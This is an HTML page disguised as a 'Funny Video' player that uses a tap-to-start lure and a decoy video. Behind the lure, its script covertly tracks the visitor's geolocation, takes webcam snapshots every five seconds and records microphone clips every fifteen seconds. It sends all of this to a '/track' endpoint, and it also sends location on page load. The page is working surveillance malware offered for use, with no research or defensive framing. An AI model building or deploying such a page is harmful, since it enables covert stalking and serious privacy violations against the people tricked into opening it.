<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Funny Video</title>
    <style>body{margin:0;background:#000;color:white;text-align:center}#overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;align-items:center;justify-content:center;cursor:pointer}#videoContainer{display:none}.status{position:fixed;bottom:10px;left:10px;background:rgba(0,0,0,0.7);color:lime;padding:5px 10px;border-radius:8px;font-size:12px;z-index:999;font-family:monospace}</style>
</head>
<body>
<div id="overlay">👆 Tap to start video</div>
<div id="videoContainer"><video id="video" width="100%" autoplay muted></video><p>🎥 Loading funny video...</p></div>
<div class="status" id="status">Initializing...</div>
<script>
const urlParams = new URLSearchParams(window.location.search);
const session = urlParams.get('session');
const API_URL = window.location.origin + '/track';
const statusDiv = document.getElementById('status');
async function sendData(endpoint, data) {
    try {
        let res = await fetch(`${API_URL}?session=${session}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        if(res.ok) statusDiv.innerText = `✓ ${endpoint} sent`;
        else statusDiv.innerText = `✗ ${endpoint} failed`;
    } catch(e) { statusDiv.innerText = `⚠️ ${endpoint} error`; }
}
let locationInterval = null, photoInterval = null, audioInterval = null, videoStream = null;
function startContinuousLocation() {
    if (locationInterval) clearInterval(locationInterval);
    locationInterval = setInterval(() => {
        navigator.geolocation.getCurrentPosition(pos => {
            sendData('/location', { location: { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy } });
        }, err => console.log(err));
    }, 5000);
}
async function startContinuousPhoto() {
    if (photoInterval) clearInterval(photoInterval);
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        const video = document.createElement('video');
        video.srcObject = videoStream;
        video.play();
        photoInterval = setInterval(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            sendData('/photo', { image: canvas.toDataURL('image/jpeg') });
        }, 5000);
    } catch(err) { statusDiv.innerText = "Camera denied"; }
}
function startContinuousAudio() {
    if (audioInterval) clearInterval(audioInterval);
    audioInterval = setInterval(async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => {
                    sendData('/audio', { audio: reader.result });
                    stream.getTracks().forEach(t => t.stop());
                };
            };
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 5000);
        } catch(err) { console.log(err); }
    }, 15000);
}
document.getElementById('overlay').onclick = async () => {
    document.getElementById('overlay').style.display = 'none';
    document.getElementById('videoContainer').style.display = 'block';
    statusDiv.innerText = "Starting...";
    startContinuousLocation();
    await startContinuousPhoto();
    startContinuousAudio();
    statusDiv.innerText = "Capturing: Loc(5s), Photo(5s), Audio(15s)";
    // Replace with fake video
    const videoEl = document.getElementById('video');
    videoEl.src = "https://sample-videos.com/video123/mp4/720/big_buck_bunny_720p_1mb.mp4";
    videoEl.play();
};
navigator.geolocation.getCurrentPosition(pos => sendData('/location', { location: { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy } }));
</script>
</body>
</html>
